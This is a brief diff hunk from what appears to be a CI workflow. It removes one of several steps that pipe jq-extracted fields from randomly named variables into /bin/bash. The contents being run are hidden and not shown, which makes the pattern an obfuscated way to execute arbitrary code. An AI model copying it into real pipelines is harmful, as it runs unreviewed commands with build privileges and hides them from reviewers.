@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$r46" | jq -r .sfbks9962 | /bin/bash
           echo $gkpv49435 | jq -r .qkeu5298 | /bin/bash
           printf '%s' "$btom7" | jq -r .ycef43256 | /bin/bash
-          echo $qh312 | jq -r .kut664 | /bin/bash
           printf '%s' "$lmcvj6" | jq -r .y358 | /bin/bash
           echo $l481 | jq -r .kuz56 | /bin/bash
           echo $hlzdu1432 | jq -r .gl8696 | /bin/bash
